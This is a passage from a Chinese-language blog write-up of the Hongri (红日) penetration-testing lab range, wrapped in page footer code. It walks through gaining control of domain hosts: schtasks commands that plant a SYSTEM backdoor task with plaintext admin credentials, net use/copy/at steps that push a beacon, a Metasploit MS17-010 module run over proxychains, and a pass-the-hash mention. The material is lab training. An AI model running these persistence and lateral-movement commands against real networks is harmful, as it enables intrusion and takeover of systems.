+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211194649-jvut2cj.png" alt="image">​</p>
+<h4 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h4><pre class=" language-shell"><code class="language-shell">schtasks /create /s 192.168.52.138 /tn backdoors /sc minute /mo 1  /tr c:\dc3.exe /ru system /f
+</code></pre>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211191356-e02wn7b.png" alt="image">​</p>
+<p>成功上线</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211191046-iybdkoz.png" alt="image">​</p>
+<p>在没有建立ipc连接时，要加上&#x2F;u和&#x2F;p参数分别设置用户名和密码。</p>
+<p>但也有些时候，由于当前权限或组策略设置等原因，该schtasks方法远程创建计划任务可能会报错拒绝访问,这时候也需要高权限的用户帐号密码：</p>
+<pre class=" language-shell"><code class="language-shell">schtasks /create /s 192.168.52.138 /u administrator /p qwe123!@# /tn backdoor /sc minute /mo 1 /tr c:\dc3.exe /ru system /f
+</code></pre>
+<p>另一台主机(2003)利用at上线</p>
+<pre class=" language-shell"><code class="language-shell">shell net use \\192.168.52.141 "qwe123!@#" /user:"administrator"
+shell copy dc3.exe \\192.168.52.141\c$
+shell net time
+shell at \\192.168.52.141 19:40 C:\dc3.exe
+</code></pre>
+<p>我这里利用at上线有点问题，会报错：</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212063112-bg5ebnx.png" alt="image">​</p>
+<p>这里的打法还是就用ms17010吧，实在打不通</p>
+<p>挂上proxychains4，用msf打</p>
+<p>记得生成一个32位的马，这里的2003是x86架构的</p>
+<pre class=" language-xml"><code class="language-xml">use auxiliary/admin/smb/ms17_010_command
+set rhosts 192.168.164.156 192.168.164.161
+set command C:\\beacon_x86.exe
+show options
+run
+</code></pre>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212092802-yv0emen.png" alt="image">​</p>
+<p>运行后成功上线：</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212092814-ttcpke3.png" alt="image">​</p>
+<p>至此打靶完成</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212092831-zloyyws.png" alt="image">​</p>
+<h2 id="PTH域控打法"><a href="#PTH域控打法" class="headerlink" title="PTH域控打法"></a>PTH域控打法</h2><p>可以利用Win7横向PTH</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212093432-hl4qs4y.png" alt="image">​</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212093518-5k8rq96.png" alt="image">​</p>
+<p>这里利用taowu的插件就可以横向了</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212093530-90gyeya.png" alt="image">​</p>
+<p>‍</p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1"><span class="toc-number">1.</span> <span class="toc-text">红日靶场1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">靶场配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell%E5%A4%96%E5%9B%B4%E6%9C%BA"><span class="toc-number">1.3.</span> <span class="toc-text">getshell外围机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.4.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MS17010%E5%9F%9F%E6%8E%A7%E6%89%93%E6%B3%95"><span class="toc-number">1.5.</span> <span class="toc-text">MS17010域控打法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%9F%9F%E6%8E%A7%E6%89%93%E6%B3%95"><span class="toc-number">1.6.</span> <span class="toc-text">计划任务域控打法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A2%B0%E6%92%9E"><span class="toc-number">1.6.1.</span> <span class="toc-text">密码碰撞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IPC%E6%A8%AA%E5%90%91"><span class="toc-number">1.6.2.</span> <span class="toc-text">IPC横向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAIPC%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">创建IPC连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">创建计划任务</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH%E5%9F%9F%E6%8E%A7%E6%89%93%E6%B3%95"><span class="toc-number">1.7.</span> <span class="toc-text">PTH域控打法</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&text=红日靶场1"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&title=红日靶场1"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&is_video=false&description=红日靶场1"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=红日靶场1&body=Check out this article: https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&title=红日靶场1"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&title=红日靶场1"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&title=红日靶场1"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&title=红日靶场1"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&name=红日靶场1&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&t=红日靶场1"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    清风
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">首页</a></li><!--
+    --><!--
+      --><li><a href="/about/">关于</a></li><!--
+    --><!--
+      --><li><a href="/archives/">归档</a></li><!--
+    --><!--
+      --><li><a href="/categories/">分类</a></li><!--
+    --><!--
+      --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'qing3feng/qingfengComments';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
